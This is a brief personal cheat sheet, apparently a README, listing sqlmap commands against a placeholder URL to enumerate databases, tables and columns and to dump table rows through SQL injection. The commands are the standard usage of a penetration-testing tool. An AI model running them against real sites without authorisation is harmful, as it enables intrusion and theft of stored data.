# SQLMAP commands

This is a simple file for remind me some sqlmap instructions.

### Show databases
	sqlmap someurl.com/file.php?action=arg --dbs

### Show tables
	sqlmap someurl.com/file.php?action=arg -D SomeDatabase --tables

### Show columns
	sqlmap someurl.com/file.php?action=arg -D SomeDatabase -T someTable --columns

### Get rows of table
	sqlmap someurl.com/file.php?action=arg -D SomeDatabase -T someTable --dump	
